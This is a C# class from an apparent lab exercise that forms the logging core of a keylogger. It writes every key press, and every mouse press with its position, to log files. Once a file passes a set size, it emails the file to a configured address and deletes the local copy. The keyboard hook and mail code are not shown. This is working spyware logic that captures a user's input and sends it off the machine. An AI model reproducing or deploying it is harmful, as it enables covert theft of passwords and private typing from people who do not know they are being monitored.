using System;
using System.IO;

namespace Lab8
{
    public class LogManager
    {
        private readonly Settings _settings;
        private const string KeyPressedLog = "./keyPressed.log";
        private const string MousePressedLog = "./mousePressed.log";

        public LogManager(Settings _set)
        {
            _settings = _set;
        }

        public void KeyLogManager(string _keyName)
        {
            using (var streamWriter = new StreamWriter(KeyPressedLog, true))
            {
                streamWriter.WriteLine(DateTime.Now + ": " + _keyName + "");
                streamWriter.Dispose();
            }
            CheckSize(KeyPressedLog);
        }

        public void MouseLogManager(string _keyName, string _position)
        {
            using (var streamWriter = new StreamWriter(MousePressedLog, true))
            {
                streamWriter.WriteLine(DateTime.Now + ": " + _keyName + " "+ " Position: "+ _position);
            }
            CheckSize(MousePressedLog);
        }

        private void CheckSize(string _filePath)
        {
            if (new FileInfo(_filePath).Length > _settings.FileSize)
            {
                if (!string.IsNullOrEmpty(_settings.Email))
                {
                    new EmailManager().SendEmail(_settings.Email, "Log file", _filePath);
                    new FileInfo(_filePath).Delete();
                }
            }
        }
    }
}
